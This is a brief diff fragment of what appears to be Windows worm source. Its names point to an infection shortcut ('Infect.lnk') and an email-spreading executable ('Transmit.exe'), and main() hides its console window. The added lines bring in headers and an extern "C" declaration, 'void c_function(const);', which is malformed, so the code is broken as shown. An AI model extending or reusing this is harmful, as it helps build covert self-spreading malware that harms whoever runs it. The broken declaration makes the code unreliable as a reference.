@@ -9,9 +9,15 @@
 #define INFECT_LINK_NAME "Infect.lnk"  //link file
 #define EMAIL_SENDER_FILE_NAME "Transmit.exe"  //email sender
 
+#include <iostream>
+#include <stdio.h>
 #include <windows.h>
 #include <string>
 #include <time.h>
+
+extern "C" {
+    void c_function(const);
+}
 
 main(){
     FreeConsole();  //window is not visible
